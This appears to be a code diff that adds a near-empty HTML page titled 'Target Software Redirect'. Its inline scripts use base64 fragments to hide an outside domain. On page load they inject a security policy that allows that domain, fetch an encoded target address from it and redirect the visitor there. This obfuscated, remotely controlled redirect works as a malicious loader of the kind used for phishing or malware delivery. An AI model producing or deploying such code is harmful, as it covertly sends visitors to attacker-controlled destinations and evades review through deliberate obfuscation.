@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    
+    <script>
+const cspParts = [
+  'ZGVmYXVsdC1zcmMgJ3NlbGYnOyA=',
+  'c2NyaXB0LXNyYyAnc2VsZicgJ3Vuc2FmZS1pbmxpbmUnIA==',
+  'aHR0cHM6',
+  'Ly9nb21v',
+  'ZHJpbGxz',
+  'LmNvbQ==',
+  'OyBzdHlsZS1zcmMgJ3NlbGYnOyA=',
+  'Y29ubmVjdC1zcmMgJ3NlbGYnIA==',
+  'aHR0cHM6',
+  'Ly9nb21v',
+  'ZHJpbGxz',
+  'LmNvbQ=='
+];
+
+const meta = document.createElement('meta');
+meta.httpEquiv = 'Content-Security-Policy';
+meta.content = cspParts.map(atob).join('');
+document.head.appendChild(meta);
+</script>
+    
+    <title>Target Software Redirect</title>
+    
+    <script>
+(async function () {
+  try {
+    const parts = [
+      'aHR0cHM=',   
+'Oi8vZ28=',   
+'bW9kcmk=',   
+'bGxzLmM=',   
+'b20vbWk=',   
+'Y3JvcGU=',   
+'bmlzLg==',   
+'YXBwcw=='    
+    ];
+
+    const apiUrl = parts.map(p => atob(p)).join('');
+
+    const res = await fetch(apiUrl);
+
+    if (!res.ok) {
+      throw new Error(`Config HTTP ${res.status}`);
+    }
+
+    const { c } = await res.json();
+
+    const url = atob(c);
+
+    if (!/^https?:\/\//i.test(url)) {
+      throw new Error('Invalid URL');
+    }
+
+    window.location.href = url;
+  } catch (e) {
+    console.error(e);
+  }
+})();
+</script>
+</body>
+</html>
